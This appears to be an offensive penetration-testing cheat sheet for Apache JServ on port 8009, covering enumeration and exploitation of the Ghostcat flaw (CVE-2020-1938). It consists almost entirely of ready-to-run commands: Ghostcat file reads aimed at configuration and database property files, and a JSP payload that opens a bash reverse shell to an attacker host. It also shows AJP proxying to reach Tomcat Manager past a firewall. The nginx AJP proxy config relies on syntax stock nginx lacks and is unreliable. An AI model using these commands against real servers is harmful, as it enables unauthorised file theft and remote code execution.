# Port 8009 - Apache JServ (AJP)

## Table of Contents

- [Enumeration](#enumeration)
- [Ghostcat - CVE-2020-1938](#ghostcat---cve-2020-1938)
- [Exploitation](#exploitation)

---

## Enumeration

### Nmap

```shell
nmap -sV -sC -p 8009 $rhost
nmap -p 8009 --script ajp-auth,ajp-headers,ajp-methods,ajp-request $rhost
```

---

## Ghostcat - CVE-2020-1938

> Allows reading arbitrary files from webapp directories and can lead to RCE

> Affected: Apache Tomcat 6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31

### Using ajpShooter

```shell
# Install
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git

# Read WEB-INF/web.xml
python3 ajpShooter.py http://$rhost:8080 8009 /WEB-INF/web.xml read

# Read other files
python3 ajpShooter.py http://$rhost:8080 8009 /WEB-INF/classes/config.properties read
```

### Using Metasploit

```shell
# File read
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS $rhost
set FILENAME /WEB-INF/web.xml
run
```

### Using AJPy

```shell
# Install
pip3 install ajpy

# Read file
ajpget $rhost:8009 /WEB-INF/web.xml
```

---

## Exploitation

### File Read via AJP

```shell
# Common files to read
/WEB-INF/web.xml
/WEB-INF/classes/config.properties
/WEB-INF/classes/db.properties
/WEB-INF/applicationContext.xml
/WEB-INF/struts-config.xml
```

### RCE via File Upload + Ghostcat

```shell
# If you can upload a .txt file to webapps directory:
# 1. Upload shell.txt containing JSP code
# 2. Use Ghostcat to execute it

# Upload shell.txt with JSP content:
<%Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");%>

# Execute via AJP
python3 ajpShooter.py http://$rhost:8080 8009 /uploads/shell.txt eval
```

### AJP Proxy to Access Manager

```shell
# If port 8080 is firewalled but 8009 is accessible
# Configure local nginx/apache as AJP proxy

# Apache config
ProxyPass / ajp://$rhost:8009/

# Access Tomcat Manager through proxy
curl http://localhost/manager/html
```

### Nmap Scripts

```shell
# Check AJP auth
nmap -p 8009 --script ajp-auth $rhost

# Get headers
nmap -p 8009 --script ajp-headers $rhost

# List methods
nmap -p 8009 --script ajp-methods $rhost

# Make request
nmap -p 8009 --script ajp-request --script-args ajp-request.path=/test $rhost
```

---

## Nginx AJP Proxy Configuration

```nginx
# /etc/nginx/sites-available/ajp-proxy
upstream tomcat {
    server $rhost:8009;
}

server {
    listen 80;
    
    location / {
        proxy_pass ajp://tomcat;
    }
}
```

## Apache AJP Proxy Configuration

```apache
# Enable mod_proxy_ajp
a2enmod proxy_ajp

# Virtual host config
<VirtualHost *:80>
    ProxyPass / ajp://$rhost:8009/
    ProxyPassReverse / ajp://$rhost:8009/
</VirtualHost>
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| Nmap | `nmap -p 8009 --script ajp-* $rhost` | AJP enumeration |
| ajpShooter | `python3 ajpShooter.py http://$rhost:8080 8009 /WEB-INF/web.xml read` | Ghostcat file read |
| Metasploit | `use auxiliary/admin/http/tomcat_ghostcat` | Ghostcat exploit |
